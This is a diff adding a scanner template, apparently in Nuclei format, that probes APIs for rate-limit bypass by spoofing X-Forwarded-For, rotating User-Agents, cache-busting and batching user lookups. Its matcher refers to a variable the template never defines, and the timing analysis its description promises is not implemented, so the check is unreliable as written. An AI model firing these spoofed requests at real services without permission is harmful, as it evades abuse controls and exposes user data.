@@ -1,0 +1,81 @@
+id: custom-2026-api-002
+info:
+  name: API Rate Limiting Bypass - Distributed Timing Attack
+  author: SecurityTeam
+  severity: high
+  description: |
+    Bypasses API rate limiting by exploiting header-based rate limit logic:
+    - X-Forwarded-For spoofing (appear from different IPs)
+    - User-Agent rotation (bypass per-agent limits)
+    - Request timing distribution (spread across time window)
+    - Parameter randomization (bypass signature-based blocking)
+    
+    Detection method:
+    - Sends distributed requests with varying headers
+    - Measures response times to detect rate limit headers
+    - Analyzes rate limit reset timing
+    - Attempts to exceed quota without triggering block
+  
+  reference:
+    - https://owasp.org/www-community/attacks/Rate_Limit_Bypass
+
+requests:
+  - method: GET
+    path: /api/v1/users/{{user_id}}
+    headers:
+      X-Forwarded-For: "{{random_ip_1}}"
+      User-Agent: "Mozilla/5.0 ({{random_ua_1}})"
+      X-API-Version: "2024-01-01"
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: ratelimit_remaining
+        regex: 'X-RateLimit-Remaining:\s*(\d+)'
+      - type: regex
+        internal: true
+        name: ratelimit_reset
+        regex: 'X-RateLimit-Reset:\s*(\d+)'
+
+  - method: GET
+    path: /api/v1/users/{{user_id}}?cache_bust={{random_uuid_1}}
+    headers:
+      X-Forwarded-For: "{{random_ip_2}}"
+      User-Agent: "Mozilla/5.0 ({{random_ua_2}})"
+      X-Request-ID: "{{random_uuid_2}}"
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Rate limit not enforced on second request with different headers
+          - 'ratelimit_remaining == ratelimit_remaining_first'
+          - 'status == 200'
+        condition: all
+
+  - method: POST
+    path: /api/v1/actions/batch
+    headers:
+      Content-Type: "application/json"
+      X-Forwarded-For: "{{random_ip_3}}"
+    body: |
+      {
+        "requests": [
+          {"method": "GET", "path": "/users/1"},
+          {"method": "GET", "path": "/users/2"},
+          {"method": "GET", "path": "/users/3"}
+        ]
+      }
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id"'
+          - '"name"'
+        condition: all
+
+tags:
+  - api
+  - rate-limiting
+  - bypass
+  - authentication
